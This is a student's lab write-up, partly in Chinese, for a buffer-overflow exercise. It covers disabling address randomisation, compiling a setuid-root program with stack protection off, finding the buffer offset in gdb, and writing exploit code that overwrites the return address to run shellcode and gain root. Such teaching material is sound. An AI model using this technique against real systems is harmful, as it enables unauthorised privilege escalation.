## lab 2.3

### overview
The learning objective of this lab is for students to gain the first-hand experience on buffer-overflow vulnerability by putting what they have learned about the vulnerability from class into actions. Buffer overflow is defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated fixed length buffers. This vulnerability can be utilized by a malicious user to alter the flow control of the program, even execute arbitrary pieces of code. This vulnerability arises due to the mixing of the storage for data (e.g. buffers) and the storage for controls (e.g. return addresses): an overflow in the data part can affect the control flow of the program, because an overflow can change the return address.

In this lab, you will be given a program with a buffer-overflow vulnerability; your task is to develop a scheme to exploit the vulnerability and finally to gain the root privilege. It uses Ubuntu VM created in Lab 2.1. Ubuntu 12.04 is recommended.

### steps

1. 禁用地址空间随机化

   ![image-20220523135502126](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/image-20220523135502126.png)
2. 编译stack,`sudo gcc -o stack -z execstack -fno-stack-protector stack.c`,`chmod 4755 stack`
3. 进入gdb调试stack,使用`disass bof`查看bof函数段的汇编代码
   ![20220528132909](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/20220528132909.png)
4. 可以看到buffer段在距离rbp指针0xc+8=0x14的地址处
5. 使用`break *bof+27`设置断点,查看程序运行到此处时的rax值
   ![20220528133125](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/20220528133125.png)
6. 在exploit.c中填入以下代码以进行缓冲区溢出攻击
   ```c
     /* You need to fill the buffer with appropriate contents
     here */
     strcpy(buffer+0x14,"\xb4\xdc\xff\xff\xff\x7f");
     strcpy(buffer+0x100,code);
   ```
7. 编译exploit.c,并运行stack进行缓冲区溢出攻击,可以观察到攻击成功
   ```bach
       gcc -o exploit exploit.c 
       ./exploit
       ./stack
    ```
   ![20220528132657](https://typora-1309407228.cos.ap-shanghai.myqcloud.com/20220528132657.png)
